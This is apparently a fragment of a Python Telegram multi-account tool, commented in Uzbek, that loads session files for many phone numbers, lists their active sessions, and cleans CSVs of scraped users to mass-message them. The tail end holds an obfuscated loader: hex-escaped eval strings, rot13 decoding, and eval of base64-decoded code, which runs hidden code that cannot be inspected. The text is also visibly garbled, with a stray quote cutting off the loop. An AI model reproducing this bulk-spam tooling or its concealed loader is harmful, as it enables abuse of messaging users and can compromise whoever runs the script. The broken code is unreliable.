             try:
                result = c(functions.account.GetAuthorizationsRequest())
                print(result.stringify())
                
                print(f'=======Barcha seanslar roʻyxati muvaffaqiyatli kiritildi {cy}{acc_name}{lg}======== ')
             except Exception as e:
                print(f'{e}')
                continue
            if send_status != 0:
                print(f"\n{lg}session yakunlandi...")
            else:
                print(f"\n{lg}Barcha hisob qaydnomasi barcha seanslar roʻyxatida muvaffaqiyatli qayd etildi")
                
def msgsendextra():

 lines = list()


 def main():
        lines = list()
        with open('data.csv', 'r', encoding='UTF-8') as readFile:

            reader = csv.reader(readFile)

            for row in reader:

                lines.append(row)

                for field in row:

                    if field == '':
                        lines.remove(row)
        with open('1.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, delimiter=",", lineterminator="\n")

            writer.writerows(lines)


 def main1():
        lines = list()
        with open('1.csv', 'r', encoding='UTF-8') as readFile:

            reader = csv.reader(readFile)

            for row in reader:

                lines.append(row)

                for field in row:

                    if field == 'username':
                        lines.remove(row)

        with open('2.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, delimiter=",", lineterminator="\n")

            writer.writerows(lines)


 main()
 main1()

 with open("2.csv", "r", encoding='UTF-8') as source:
        rdr = csv.reader(source)

        with open("data.csv", "w", encoding='UTF-8') as f:
            writer = csv.writer(f, delimiter=",", lineterminator="\n")
            writer.writerow(['sr. no.', 'username', 'user id', 'access_hash', 'name', 'group','status'])
            i = 0
            for row in rdr:
                i += 1
                writer.writerow((i, row[1], row[2], row[3], row[4], row[5], row[6]))

 os.remove("1.csv")
 os.remove("2.csv")

 init()
 r = Fore.LIGHTRED_EX
 gr = Fore.GREEN
 n = Fore.RESET
 bl = Fore.BLUE
 ye = Fore.YELLOW


 config = configparser.ConfigParser()
 config.read("config.ini")
 stopnum = config['Shoirjon_official']['EnterStop']
 stacno = config['Shoirjon_official']['StartingAccount']
 endacno = config['Shoirjon_official']['EndAccount']

 phone = []

 with open('phone.csv', 'r') as delta_obj:
        csv_reader = reader(delta_obj)
        list_of_phone = tuple(csv_reader)
        for phone_ in list_of_phone:
            phone.append(int(phone_[0]))
        pphone = phone

 print(f'{gr}Jami hisoblar: {n} {r}{str(len(phone))}{n}')



 def autos():
        print(Style.BRIGHT + Fore.GREEN + 'Har bir sõrov uchun kechikish vaqtini kiriting 0 Yõq : ')
        HackingZone_dev = int(input())
        HackingZone = 'data.csv'
        From = int(stacno) - 1
        Upto = int(endacno)
        rex = int(1)
        hacks = int(50) - 1
        stop = int(stopnum)
        
        message = str(input(f"xabaringizni yuboring{lg}"))
        
        with open('memory.csv', 'w', encoding='UTF-8') as file:
            writer = csv.writer(file, delimiter=",", lineterminator="\n")
            writer.writerow([rex, rex + hacks])
        a = 0
        indexx = 0
        for xd in pphone[From:Upto]:
            indexx += 1
            print(f'Index : {indexx}')
            phone = utils.parse_phone(xd)
            print(f"Login {phone}")
            client = TelegramClient(f"sessions/{phone}", API_ID, HashID)
            client.connect()
            if not client.is_user_authorized():
                print(f'{r}bazi narsa õzgardi{n}')
         '
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))